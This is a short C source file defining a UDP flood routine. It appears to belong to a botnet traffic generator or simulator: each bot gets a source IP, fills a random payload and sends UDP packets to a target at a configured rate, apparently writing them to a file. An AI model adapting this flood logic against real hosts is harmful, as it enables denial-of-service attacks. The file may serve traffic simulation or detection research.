#include "attacks.h"

u64
unit_udpflood(FILE *f, u32 index)
{
	u8 src[4];
	u8 payload[1400];
	u16 i;

	bot_ip(index, src);
	for (i = 0; i < g_atk.payload_len; i++)
		payload[i] = (u8)rng_u32();
	send_udp(f, src, g_atk.target, (u16)rng_range(1024, 65535),
	    (u16)(g_atk.target_port ? g_atk.target_port :
	    rng_range(1, 65535)), payload, g_atk.payload_len);
	return (1000000u / (g_atk.rate ? g_atk.rate : 1));
}
